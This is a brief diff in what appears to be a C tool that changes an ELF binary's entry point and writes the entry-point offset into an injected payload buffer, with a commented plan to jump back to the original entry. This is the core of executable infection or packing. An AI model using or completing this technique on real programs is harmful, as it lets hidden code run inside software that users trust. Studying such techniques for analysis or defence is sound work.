@@ -210,6 +210,12 @@ int main(int argc, char **argv)
 					header->e_entry = new_entry_point;
 					printf("New entry point: 0x%08lx\n", new_entry_point);
 
+					uint64_t entry_delta = new_entry_point - old_entry_point;
+					printf("Entry point delta: 0x%lx\n", entry_delta);
+
+					// inject the delta into the payload starting at the 3rd byte
+					*(uint64_t *)(payload_content + 2) = entry_delta;
+
 					// add a jump to the original entry point
 					// E9 xx xx xx xx
 					// *(uint8_t *)(payload_content + payload_size - 9) = 0xE9;
